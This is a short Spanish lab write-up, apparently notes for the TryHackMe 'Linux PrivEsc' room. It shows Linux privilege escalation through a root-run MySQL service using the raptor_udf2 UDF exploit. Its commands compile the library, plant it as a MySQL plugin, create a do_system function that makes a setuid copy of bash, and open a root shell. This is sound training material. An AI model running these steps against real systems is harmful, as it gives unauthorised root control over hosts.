# Service Exploit

Una de las formas que se puede escalar privilegios es ver que servicios corre en el sistema ,muchas veces estos servicios tienen  privilegios altos o vulnerabilidades que nos podr√≠a ayudar a escalar privilegio en un sistema.

En la maquina de linuxprivesc en tryhackme tiene MySQL a traves de ese servicio se puede realizar la escalda utilizando un exploit conocido ,llamado MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2):

{% embed url="https://www.exploit-db.com/exploits/1518" %}

Pasos de para escalar privilegios con MySQL.

1. Compilar el exploit:

```
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

1. Conectarse al servidor:

```
mysql -u root -p
```

1. Ejecutar los comandos en MySQL y crear User Defined Function (UDF) "do\_system"

`use mysql;`&#x20;

`reate table foo(line blob);`&#x20;

`insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));`&#x20;

`select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';`&#x20;

`create function do_system returns integer soname 'raptor_udf2.so';`&#x20;

`select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');`

`exit`

1. Cuando relizas los pasos anteriores salis de mysql y ejecutar los siguientes comandos

`/tmp/rootbash -p`&#x20;

Esto es un ejemplo de la maquina de como se puede utilizar un servicio para escalar privilegios.

[TryHackMe | Linux PrivEsc](https://tryhackme.com/r/room/linuxprivesc)
